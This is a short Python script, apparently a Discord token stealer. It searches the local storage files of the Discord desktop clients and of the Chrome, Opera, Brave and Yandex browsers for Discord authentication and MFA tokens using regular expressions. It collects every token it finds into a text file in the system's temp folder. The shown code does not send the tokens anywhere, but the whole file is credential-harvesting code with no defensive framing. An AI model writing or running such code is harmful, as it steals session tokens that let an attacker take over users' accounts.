import os
import re
import json
import tempfile

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token not in tokens:  # Check for duplicates
                        tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    tokens = []

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens.extend(find_tokens(path))

    tokens = list(set(tokens))  # Remove duplicates

    output = ''
    if len(tokens) > 0:
        output += '**Discord Tokens**:\n```\n'
        for token in tokens:
            output += f'{token}\n'
        output += '```'
    else:
        output += 'No tokens found.'

    temp_folder = tempfile.gettempdir()
    output_file = os.path.join(temp_folder, 'discord_token.txt')

    with open(output_file, 'w') as file:
        file.write(output)

if __name__ == '__main__':
    main()
